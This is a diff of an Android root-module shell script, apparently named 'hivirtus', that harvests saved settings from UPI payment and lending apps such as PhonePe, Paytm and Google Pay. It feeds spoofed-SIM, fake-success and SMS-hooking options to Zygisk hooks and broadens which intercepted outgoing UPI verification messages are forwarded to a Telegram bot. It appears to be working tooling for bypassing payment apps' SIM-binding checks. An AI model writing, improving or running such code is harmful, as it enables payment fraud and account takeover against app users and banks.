@@ -93,16 +93,16 @@ hivirtus_harvest_saves() {
     fi
   done
   if [ -n "$found" ]; then
-    OLD_MT=$(stat -c %Y /data/local/tmp/hivirtus_ui_save.json 2>/dev/null || echo 0)
-    cp -f "$found" /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
-    chmod 666 /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
-    NEW_MT=$(stat -c %Y "$found" 2>/dev/null || echo 0)
-    LAST_H=$(cat /data/local/tmp/hivirtus_harvest_log.ts 2>/dev/null || echo 0)
-    NOW=$(date +%s)
-    if [ "$NEW_MT" != "$OLD_MT" ]; then
-      # Only log real content changes — 30s spam was heating phone
+    # CRITICAL: only promote if app copy is NEWER than global tmp.
+    # Old PhonePe/Paytm copies were overwriting fresh Save → same number stuck.
+    TMP_SAVE=/data/local/tmp/hivirtus_ui_save.json
+    FOUND_MT=$(stat -c %Y "$found" 2>/dev/null || echo 0)
+    TMP_MT=$(stat -c %Y "$TMP_SAVE" 2>/dev/null || echo 0)
+    if [ ! -f "$TMP_SAVE" ] || [ "$FOUND_MT" -gt "$TMP_MT" ]; then
+      cp -f "$found" "$TMP_SAVE" 2>/dev/null
+      chmod 666 "$TMP_SAVE" 2>/dev/null
       echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      echo "$NOW" > /data/local/tmp/hivirtus_harvest_log.ts
+      date +%s > /data/local/tmp/hivirtus_harvest_log.ts 2>/dev/null
     fi
   fi
   for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android com.herofincorp.diyjourneys; do
@@ -139,34 +139,15 @@ hivirtus_harvest_saves() {
 
 sync_config() {
   hivirtus_harvest_saves
-  # Runtime JSON overwrite mat karo (telegram wipe) — sirf spoof phone + first-boot seed
-  # Promote HTML Save → runtime so Zygisk hooks pick up without app restart
+  # Save JSON is source of truth — full copy when newer (sed merge left old phone stuck)
   if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
     SAVE=/data/local/tmp/hivirtus_ui_save.json
-    if [ -f "$RUNTIME" ]; then
-      # Keep runtime; overlay key fields from save via simple replace of known keys
-      for key in enable_sim1_mock enable_phone_spoof enable_virtual_sim intercept_fake_success \
-                 hook_outgoing_sms prefix_enabled override_incoming_sender auto_forward_token \
-                 fake_intercept_telegram; do
-        val=$(grep -o "\"$key\"[[:space:]]*:[[:space:]]*[^,}]*" "$SAVE" 2>/dev/null | head -n1 | sed 's/.*:[[:space:]]*//')
-        if [ -n "$val" ]; then
-          if grep -q "\"$key\"" "$RUNTIME" 2>/dev/null; then
-            sed -i "s/\"$key\"[[:space:]]*:[[:space:]]*[^,}]*/\"$key\": $val/" "$RUNTIME" 2>/dev/null
-          fi
-        fi
-      done
-      for key in mock_phone_sim1 prefix_text inject_sender_id telegram_bot_token telegram_chat_id; do
-        val=$(grep -o "\"$key\"[[:space:]]*:[[:space:]]*\"[^\"]*\"" "$SAVE" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
-        if [ -n "$val" ] || grep -q "\"$key\"" "$SAVE" 2>/dev/null; then
-          if grep -q "\"$key\"" "$RUNTIME" 2>/dev/null; then
-            sed -i "s/\"$key\"[[:space:]]*:[[:space:]]*\"[^\"]*\"/\"$key\": \"$val\"/" "$RUNTIME" 2>/dev/null
-          fi
-        fi
-      done
-    else
+    SAVE_MT=$(stat -c %Y "$SAVE" 2>/dev/null || echo 0)
+    RUN_MT=$(stat -c %Y "$RUNTIME" 2>/dev/null || echo 0)
+    if [ ! -f "$RUNTIME" ] || [ "$SAVE_MT" -ge "$RUN_MT" ]; then
       cp -f "$SAVE" "$RUNTIME" 2>/dev/null
     fi
-    chmod 644 "$RUNTIME" 2>/dev/null
+    chmod 666 "$RUNTIME" 2>/dev/null
   fi
 
   SRC=""
@@ -723,7 +704,7 @@ forward_blocked_telegram() {
   [ -z "$BLOCKED_BODY" ] && [ -z "$BLOCKED_DEST" ] && return 0
   [ -z "$BLOCKED_BODY" ] && return 0
 
-  # ONLY outgoing UPI verify — never incoming OTP / package name / junk
+  # Skip incoming OTP noise — any other UPI outgoing is OK (not Hero-only)
   case "$BLOCKED_BODY" in
     *is\ your\ OTP*|*Valid\ for*|"<#>"*|*"Do not share with anyone"*|*UPI\ Registration*)
       echo "tg_skip_incoming_otp $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
@@ -733,13 +714,16 @@ forward_blocked_telegram() {
       return 0
       ;;
   esac
-  # Normalize punctuation so "DO NOT COPY, FORWARD" matches (SMS Tweaks body)
-  BODY_NORM=$(printf '%s' "$BLOCKED_BODY" | tr '[:lower:]' '[:upper:]' | tr -d '[:punct:]')
-  echo "$BODY_NORM" | grep -qE 'HEROAXISUPI|HEROAXIS|DO NOT COPY FORWARD|UNDER ANY CIRCUMSTANCE|USE UPI PIN ONLY|YESPROUPI' \
-    || {
-      echo "tg_skip_not_outgoing $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+  case "$BLOCKED_BODY" in
+    com.*|android.*)
+      echo "tg_skip_pkg_junk $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
       return 0
-    }
+      ;;
+  esac
+  [ ${#BLOCKED_BODY} -ge 4 ] || {
+    echo "tg_skip_short_body $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    return 0
+  }
   # To must be digits (verify shortcode / number) — never package / OTP text
   TO_DIGITS=$(printf '%s' "$BLOCKED_DEST" | tr -cd '0-9')
   [ ${#TO_DIGITS} -ge 4 ] && [ ${#TO_DIGITS} -le 15 ] || {
